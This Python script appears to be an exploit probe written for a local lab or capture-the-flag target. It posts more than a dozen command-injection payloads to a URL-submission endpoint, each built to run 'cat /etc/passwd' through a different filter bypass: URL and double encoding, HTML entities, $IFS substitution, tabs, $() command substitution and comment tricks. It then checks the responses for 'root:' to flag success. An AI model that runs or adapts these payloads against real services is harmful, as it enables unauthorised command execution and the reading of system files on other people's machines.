import requests

# Target endpoint  
url = "http://127.0.0.1:32998/add_url"

print("Testing URL encoding and various bypass techniques...")

# Try various encoding schemes
test_cases = [
    # URL encoded special chars
    ("http://127.0.0.1%3B%20cat%20/etc/passwd", "URL encoded semicolon"),
    ("http://127.0.0.1%26%26cat%20/etc/passwd", "URL encoded AND"),
    ("http://127.0.0.1%7Ccat%20/etc/passwd", "URL encoded pipe"),
    
    # Double URL encoding
    ("http://127.0.0.1%253Bcat%20/etc/passwd", "Double encoded semicolon"),
    
    # HTML entities that might decode
    ("http://127.0.0.1&#59;cat /etc/passwd", "HTML entity semicolon"),
    
    # Maybe use hash or anchors
    ("http://127.0.0.1#; cat /etc/passwd", "Anchor injection"),
    ("http://127.0.0.1?test=;cat /etc/passwd", "Query param injection"),
    
    # Using $IFS for space
    ("http://127.0.0.1;cat$IFS/etc/passwd", "IFS substitution"),
    
    # Using ${IFS}
    ("http://127.0.0.1;cat${IFS}/etc/passwd", "Brace IFS"),
    
    # Tab instead of space
    ("http://127.0.0.1;cat\t/etc/passwd", "Tab separation"),
    
    # Try command substitution with $()
    ("http://127.0.0.1/$(cat /etc/passwd)", "URL path command sub"),
    
    # Try with closing the command properly
    (";cat /etc/passwd;#", "Comment out rest"),
    (";cat /etc/passwd;echo '", "Echo close"),
    
    # Maybe there's a subprocess call with shell=False - try list injection?
    # Or maybe it uses shlex or similar
]

for payload, desc in test_cases:
    resp = requests.post(url, data={"url": payload})
    content = resp.text
    print(f"\n[{desc}]")
    print(f"  Payload: {payload[:60]}")
    if len(content) > 100 and ("root:" in content or "200 status" in content):
        print(f"  [!] SUCCESS! Response: {content[:500]}")
    else:
        print(f"  Response: {content[:100]}")

